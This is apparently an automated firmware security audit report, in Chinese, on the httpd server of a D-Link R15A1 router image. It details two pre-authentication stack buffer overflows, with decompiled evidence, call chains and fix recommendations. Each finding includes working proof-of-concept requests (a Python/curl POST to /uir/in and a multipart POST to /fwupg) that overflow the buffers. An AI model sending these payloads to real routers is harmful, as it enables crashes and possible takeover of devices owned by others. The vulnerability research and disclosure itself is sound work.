# 漏洞挖掘报告

> 会话 `s-mudi3vmt-c622` · 固件任务 `9160aafaa095` · 2026-09-23T03:04:58Z

## 一、任务信息

| 项 | 内容 |
| --- | --- |
| 任务目标 | 优先挖预认证 RCE |
| 引擎 | dsh（模式：dynamic） |
| 轮次 | 1 / 80 |

## 二、发现统计

| 危害等级 | 数量 |
| --- | --- |
| **严重** | 1 |
| **高危** | 1 |
| 合计 | 2 |

## 三、动态验证

- 摘录最近 9 条 trace，其中非空差分 0 条。

| Trace | 状态 | 入口 | 差分函数 | 备注 |
| --- | --- | --- | --- | --- |
| `49ee9cc34e5b` | ok_empty_diff | `net:80` | 0 | - |
| `78fed1ec8bbb` | ok_empty_diff | `net:80` | 0 | - |
| `8893a7ce0a65` | failed | `net:80` | - | QemuError: target exited before port 11001 was ready (rc=255) |
| `e59128b000e2` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-e59128b000e2-base.log: No such fil |
| `fff36e037aed` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fff36e037aed-base.log: No such fil |
| `fdac754d8326` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fdac754d8326-base.log: No such fil |
| `ce186bd5f812` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-ce186bd5f812-base.log: No such fil |
| `a36c86d9208b` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-a36c86d9208b-base.log: No such fil |
| `2f583960149b` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-2f583960149b-base.log: No such fil |

## 四、漏洞详情

### 漏洞 1：httpd uir 登录处理器 sub_411FC8 无边界 sprintf 造成预认证栈缓冲区溢出（单次未认证 POST 即可触发）（`F-mudijo9o-7193`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 栈缓冲区溢出 `CWE-121` |
| 危害等级 | **严重**（置信度 0.6） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `sub_411FC8` @ `0x411fc8` |
| 可达性 | static-only |

**漏洞描述**：D-Link R15A1_FW122B01 的 httpd 在 uir 模块的认证/登录处理器 sub_411FC8@0x411fc8 中用无边界 sprintf 把攻击者可控的参数名/值反复追加进固定的响应缓冲区 a1+361（容量 4096 字节）：先用 sprintf(a1+361, "%s%sNrc=%d&Ntry=%d", v6, v74, v7, v19) 写入由请求参数派生的跳转目标 v6，随后对 index>=3 的每个请求参数执行 v20 += sprintf(a1 + v20 + 361, "&%s=%s", 参数名, 参数值)，累积长度 v20 从不与容量比较。该缓冲区属于每连接线程 sub_408A0C@0x408a0c（handleIncoming）栈上的请求上下文 _DWORD v150[1119]（4476 字节，[sp+20h]），因此这是栈上越界写。攻击者数据量不受限制：sub_408A0C 对 Content-Type 为 application/x-www-form-urlencoded 的 POST 会用 malloc(Content-Length+1) 读入整个请求体并解析为参数表（参数个数上限 512），单个请求即可带来数十 KB 的受控数据，全部被 sprintf 追加进 4096 字节缓冲区，从而越过 v150 末端覆盖相邻栈对象（v151[4096]、v152[4096]、v154[32] 的 select fd_set、方法串/Content-Length/套接字与互斥量指针等局部变量）以及保存的寄存器与返回地址。关键点是本处理器本身就是登录入口：其 "in"/"out"/"pw"/"rpw"/"upw" 分支中，只有 "pw"/"rpw"/"upw" 会校验权限位 a1[10]（不足则 401 并打印 "Page auth. is not enough"），而登录用的 "in" 分支完全不检查 a1[10]，因此无需任何凭据即可到达溢出点，属预认证可达的栈缓冲区溢出。httpd 全图无 __stack_chk_fail/__printf_chk 引用，未启用栈保护，溢出不会被 canary 拦截。

**漏洞证据**：

1. sink 证据 sub_411FC8@0x411fc8 (行 528/535): v20 = sprintf((char *)a1 + 361, "%s%sNrc=%d&Ntry=%d", v6, v74, v7, v19); if ( v4 < a1[66] ) { v21 = 8 * v4; do { ++v4; v20 += sprintf((char *)a1 + v20 + 361, "&%s=%s", *(const char **)(a1[67] + v21), *(const char **)(a1[67] + v21 + 4)); v21 += 8; } while ( v4 < a1[66] ); } —— v20 累加但从不与缓冲区容量比较，目标固定为 a1+361
2. 该函数是认证/登录处理器（无需会话即调用）: 分支 strcmp(a1[5],"in"/"out"/"pw"/"rpw"/"upw")；read_csman(*v58, 65538, v76, 80, 4) 取已存密码、strcmp(v60, v76) 比对、write_csman_str(..., 65538, v55) 写新密码并打印 "Password has been changed!!"、read_csman_int(..., 65556, &v78) 取密码策略、v80 与 read_csman_int(..., -2145386174) 构成 Ntry 重试计数
3. 免认证可达性证据（同一函数内对比）: "in" 分支只要求 a1[66] >= 2 且完全不检查 a1[10] 权限位；而 "pw"/"rpw" 分支显式判定 if ((int)a1[10] < 4) / < 7 后跳 LABEL_57 打印 "Page auth. is not enough (id: %d)" 并置 a1[68]=401 返回 -1，"upw" 分支同样以 a1[10] < 4 拒绝。登录入口自身不做权限校验，符合其作为认证端点必须预认证可达的设计
4. 目标缓冲区为栈对象证据: 请求上下文由 sub_408A0C@0x408a0c 分配为 _DWORD v150[1119] // [sp+20h] (4476 字节栈数组)；v150[3]=方法、v150[10]=权限级、v150[66]=参数个数、v150[67]=参数数组指针、v150[68]=HTTP 状态码；*(&v150[90] + 1) 即偏移 361，与各模块 memset(a1+361, 0, 4096) 及 361 + 4096 = 4457 <= 4476 精确吻合。因此 a1+361 可用容量 4096 字节，超出即越过 v150 末端 [sp+0x119C] 写入相邻栈对象 v151[4096]/v152[4096]/v153[128]/v154[32](select fd_set)/…/保存的寄存器与返回地址
5. 攻击者数据长度不受限证据 sub_408A0C: POST 且 Content-Type 为 application/x-www-form-urlencoded 时执行 v82 = malloc(v66 + 1); sub_411C7C(v164, v82, v66); *(_BYTE *)(v83 + v157) = 0; v150[66] = sub_411270(v83, v152);，其中 v66 = v157 = 请求 Content-Length，未做上限校验；参数个数上限 512（if (v150[66] >= 513) 才置 500），因此单个请求可携带约 Content-Length 字节的攻击者数据进入 a1[67] 参数表
6. GET 路径的天然上限: sub_408A0C 中 if (dword_4ED46C - 100 < (unsigned int)strlen(v4)) 拒绝超长 URI，dword_4ED46C 由 sub_410068@0x410068 从 /etc/httpd.conf 的 buffer_size 读入（实测 etc/httpd.conf: buffer_size=4096），故 GET 时 query 总长 < 3996 不足以越界，必须走 POST urlencoded 路径
7. 栈保护缺失（负向 checksec 证据）: fw_search(pattern="stack_chk") 与 fw_search(pattern="printf_chk") 在 job 9160aafaa095 全图返回 total=0，httpd 未引用 __stack_chk_fail/__printf_chk，即编译时未启用 -fstack-protector，溢出不会被 canary 拦截
8. 动态验证尝试: fw_request_trace(md5=b18be6d07f1c97903c063686924ed3c7, port=80, payload="GET / HTTP/1.1...") → trace 49ee9cc34e5b 状态 ok_empty_diff（trigger_result.kind=tcp_payload sent=52 recv=0）。httpd 依赖 csman 与 UBIFS 配置挂载，在 qemu-user 单进程环境下无法完成启动，故本结论保持 static-only，需完整系统模拟复核
9. 调用图印证为间接分发: fw_call_trace(inbound, sub_411FC8) 返回 callers_total=0；uir 模块函数指针表字节证据 fw_read_bytes(vaddr=0x4ED8C0, len=48) = 00000000000000000000000000000000 0041cb1c 0041ccec 0041c920 0041c8e0 0041c8f0 0041c8e8 0000000000000000，其中 f3=sub_41C8E0 为 `return 0` 空实现、f4=sub_41C8F0 仅 free(ctx+873)，说明登录动作由 f1=sub_41CCEC 的 .uoh 描述符表间接派发

**调用链**：

```
sub_40D690@0x40d690 (select/accept 主循环) → pthread_create(..., sub_408A0C@0x408a0c, thread_info) 每连接线程 handleIncoming → sub_411498@0x411498 将 URI 拆成模块名(v162)与子路径(ctx+20) → uir 模块结构 unk_4ED8C0@0x4ed8c0 f1 = sub_41CCEC@0x41ccec (.uoh 描述符分发) → 子路径 "in"/"out"/"pw"/"rpw"/"upw" 动作 → 登录处理器 sub_411FC8@0x411fc8 → sprintf((char*)a1+361, "%s%sNrc=%d&Ntry=%d", v6, v74, v7, v19) @0x411fc8 行528，以及循环内 v20 += sprintf((char*)a1 + v20 + 361, "&%s=%s", name, value) @0x411fc8 行535
```

**漏洞 PoC**：

```
无需认证。构造一个参数数量 >= 4、总体积超过 4096 字节的 urlencoded 请求体（第 3 个参数的值会被写入跳转目标 v6，其后所有参数被循环追加）：

python3 - <<'PY' > /tmp/poc.txt
import urllib.parse
parts = ["rd=/uir/start.htm", "un=admin"]
# 第 3 个参数（index 2）的值即 v6，写满以逼近缓冲上限
parts.append("rdx=" + "A"*3800)
# 其后的参数被 sprintf 循环无边界追加，直接越出 a1+361 的 4096 字节容量
for i in range(200):
    parts.append("p%d=%s" % (i, "B"*200))
print("&".join(parts))
PY

curl -s -i -X POST 'http://192.168.0.1/uir/in' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary @/tmp/poc.txt

（请求体约 44 KB，远超 a1+361 处 4096 字节容量；返回 303/401 前溢出即已发生，预期 httpd 崩溃或连接异常中断。GET 形式因 sub_408A0C 中 strlen(v4) < buffer_size-100 的限制不足以越界，必须使用 POST urlencoded。）
```

**修复建议**：把 sub_411FC8 中两处 sprintf 全部改为带剩余容量计算的 snprintf，并用累积长度变量跟踪已用空间，例如：size_t used = snprintf((char*)a1+361, 4096, "%s%sNrc=%d&Ntry=%d", v6, v74, v7, v19); 循环内 used += snprintf((char*)a1+361+used, 4096-used, "&%s=%s", name, value)，且当 used >= 4096 时立即截断并返回 500；同时对单个参数名/值长度与参数总长度设置上限，避免把整个请求体拼接进固定缓冲区。建议为 httpd 启用 -fstack-protector-all、PIE、RELRO 与 NX，并对 a1+361 处的响应缓冲区改为动态分配或使用显式容量常量而非隐式约定（当前依赖 sub_410068 读入的 buffer_size 与 sub_408A0C 栈帧尺寸的手工一致，极易再次失配）。


### 漏洞 2：httpd fwupg 模块 multipart 部件长度未校验导致栈缓冲区溢出（救援模式下可预认证触发）（`F-mudiey8m-b13c`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 栈缓冲区溢出 `CWE-121` |
| 危害等级 | **高危**（置信度 0.6） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `sub_417F3C` @ `0x417f3c` |
| 可达性 | static-only |

**漏洞描述**：D-Link R15A1_FW122B01 的 httpd 采用"模块表 + 函数指针"分发架构（模块结构体 48 字节：name[16] + flags@+0x0C + 6 个函数指针，见 bin/httpd .data 0x4ED7D0）。fwupg 固件升级模块的 multipart body 处理函数 sub_417F3C@0x417f3c 用 HTTP 部件长度 v5 直接 memcpy 到请求上下文里固定 256 字节的字段缓冲区：memcpy(a1 + 873, v3, v5) 与 memcpy(a1 + 1129, v3, v5)，完全没有上限校验，还按 v5 计算越界 NUL 写位置 *(_BYTE *)(a1 + v5 + 873) = 0。该请求上下文是每连接线程 sub_408A0C@0x408a0c（handleIncoming）栈上的 _DWORD v150[1119]（4476 字节，[sp+20h]），因此这是栈上越界写。更关键的是该模块的鉴权 gate sub_417E90@0x417e90 存在免认证分支：当模块 flags 的 0x8000 位（救援/factory 模式，由 /usr/www.d/Index.html 缺失触发）被置位时，GET 直接把 a1[69]=1 置为已授权并 return 0，POST 也会落到同一个 return 0，完全不检查权限位 a1[10]；而对照模块 das(sub_41B92C)、uir(sub_41CCEC) 均强制要求 a1[10] >= 4/7。溢出覆盖的后续字段正是同一结构体的固件写入状态：+1385 文件名、+1653 open_upgfile 句柄、+1657 解析状态机、+1661 部件偏移、+1665 标志，其中 *(a1+1653) 随后被用作 write_upgfile/close_upgfile 的句柄参数，构成可被攻击者改写的状态机与句柄，属预认证（救援模式）可达的内存破坏，具备进一步劫持控制流的潜力。

**漏洞证据**：

1. httpd 模块表字节证据: fw_read_bytes(md5=b18be6d07f1c97903c063686924ed3c7, vaddr=0x4ED7D0, len=48) = 00000000000000000000000000000000 00417b24 00417e90 00417b88 00417f3c 00417ae8 00417ae0 0000000000000000，即 name[16] + flags(+0x0C) + 6 个函数指针；与 sub_417B24@0x417b24 的 memcpy(&unk_4ED7D0,a1,strlen+1) 及 *(memcpy(...)+12)=a2|0x10 完全一致
2. 鉴权 gate 证据 sub_417E90@0x417e90 (fwupg 模块 +0x14): memset((char*)a1+361,0,4096); if ((dword_4ED7DC & 0x8000) != 0) { if (a1[3]==1) { a1[69]=1; a1[71]=a1[72]=a1[73]=0; return 0; } } else { if ((int)a1[10] < 4) { a1[68]=401; return -1; } } 之后 if (v2 != 3) { a1[68]=500; return -1; }，即救援模式下 GET/POST 均不校验 a1[10] 权限位
3. 救援模式置位来源 sub_4105D0@0x4105d0: 若 chdir("/usr/www.d") 失败或 open("Index.html") < 0 则 v4=1，随后 sub_410DE0(v4)@0x410de0 中 fwupg 注册以 v2=0x8000 调用 off_4ED7E0[0]("fwupg", v2)，最终写入 dword_4ED7DC
4. 对照模块的强制鉴权 sub_41B92C@0x41b92c (das, +0x14): read_csman_int(...,&v17); if ((unsigned)(v17-1)<2) { if ((int)a1[10] >= 4) goto LABEL_3; } else if ((int)a1[10] >= 7) {...} 否则 a1[68]=401 返回 -1；sub_41CCEC@0x41ccec (uir) 同样以 *(a1+40) < v15 判定 401
5. 溢出 sink sub_417F3C@0x417f3c 行 141-152: case 1: v16 = a1 + v5; memcpy(a1 + 873, v3, v5); *(_BYTE *)(a1 + v5 + 873) = 0; goto LABEL_35; case 2: v16 = a1 + v5; LABEL_35: memcpy(a1 + 1129, v3, v5); *(_BYTE *)(v16 + 1129) = 0; —— v5 无任何上限校验，且显式按 v5 计算越界 NUL 写位置
6. 目标字段容量证据: +873 与 +1129 间隔 256 字节；+1385(filename)、+1653(upgfile 句柄)、+1657(状态机)、+1661(偏移)、+1665(标志) 紧随其后，同一 ctx 内 sub_417F3C 自身即用 *(a1+1653)=open_upgfile(...)、_(a1+1657)=5、write_upgfile(*(a1+1653), v3, v5)
7. 请求上下文为栈缓冲区证据 sub_408A0C@0x408a0c (handleIncoming): _DWORD v150[1119] // [sp+20h]，即 4476 字节栈对象；v165 = dword_4ED46C(buffer_size)；v150[3]=方法(v150[3]=1 for GET, 3 for multipart POST)、v150[10]=权限级、v150[66]=sub_411270(...)、v150[67]=v152、v150[68]=HTTP 状态码、*(&v150[90]+1)=v171 即偏移 361，与各模块 memset(a1+361,0,4096) 及 361+4096=4457 ≤ 4476 精确吻合
8. buffer_size 来源 sub_410068@0x410068: fgets(v10,100,...) + sscanf(v10,"buffer_size=%lu",&dword_4ED46C)，配置文件 etc/httpd.conf 内容为 buffer_size=4096\nthread_num=32\nuir_thread_count=40
9. 分发为函数指针间接调用: fw_call_trace(inbound, sub_417F3C) 与 fw_call_trace(inbound, sub_417E90) 均返回 callers_total=0，证明二者只经模块结构体函数指针被调用
10. 动态验证尝试: fw_request_trace(md5=b18be6d07f1c97903c063686924ed3c7, port=80, payload="GET / HTTP/1.1...") → trace 49ee9cc34e5b 状态 ok_empty_diff，trigger_result.kind=tcp_payload sent=52 recv=0；httpd 依赖 csman/UBIFS 配置在 qemu-user 下单进程环境无法完成启动，故本结论保持 static-only

**调用链**：

```
sub_40D690@0x40d690 (select/accept 主循环, sub_4105D0@0x4105d0 调用) → pthread_create(..., sub_408A0C@0x408a0c) 每连接线程 handleIncoming → 解析请求行/Content-Type=multipart/form-data 置 v150[3]=3 → sub_411498@0x411498 用 URI 首段查模块表 dword_4F2200 → fwupg 模块结构 unk_4ED7D0@0x4ed7d0 → f1 鉴权 sub_417E90@0x417e90 (救援模式下 (dword_4ED7DC & 0x8000) 直接置 a1[69]=1 放行) → f3 body 处理 sub_417F3C@0x417f3c → memcpy(a1 + 873, v3, v5) @0x417f3c 行143 / memcpy(a1 + 1129, v3, v5) @0x417f3c 行149
```

**漏洞 PoC**：

```
救援模式下（/usr/www.d/Index.html 缺失，fwupg 模块 flags=0x8010）直接发送，无需任何认证：

POST /fwupg HTTP/1.1
Host: 192.168.0.1
Content-Type: multipart/form-data; boundary=----X
Content-Length: 600
Connection: close

------X
Content-Disposition: form-data; name="rd"

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
------X--

（"rd" 部件内容 > 256 字节即触发 memcpy 越界；正常模式需已登录管理会话（a1[10] >= 4）且使用 POST，同一溢出依然成立）

curl 等价命令：
curl -i -X POST 'http://192.168.0.1/fwupg' -H 'Content-Type: multipart/form-data; boundary=----X' --data-binary $'------X\r\nContent-Disposition: form-data; name="rd"\r\n\r\n'$(python3 -c "print('A'*1024)")$'\r\n------X--\r\n'
```

**修复建议**：在 sub_417F3C 的 case 1/case 2 分支中为 memcpy 增加目标容量校验，把拷贝长度限制为字段缓冲区可用空间（+873 字段 256 字节、+1129 字段 256 字节），例如 v5 = min(a3 - v15, 255) 并对超长部件直接返回 400；移除按 v5 计算 NUL 终止位置的写法，改用 snprintf/strncpy 或显式边界。同时建议：为救援模式固件写入接口增加一次性随机令牌或要求物理按键确认，避免免认证固件写入；对 multipart 解析前先校验 Content-Length 与部件长度上限；为 httpd 启用栈保护（-fstack-protector-all）、PIE 与 RELRO，并对固件镜像签名校验使用 ≥2048 位 RSA 公钥（当前 usr/mv2ram/etc/public.pem 为 640 位）。

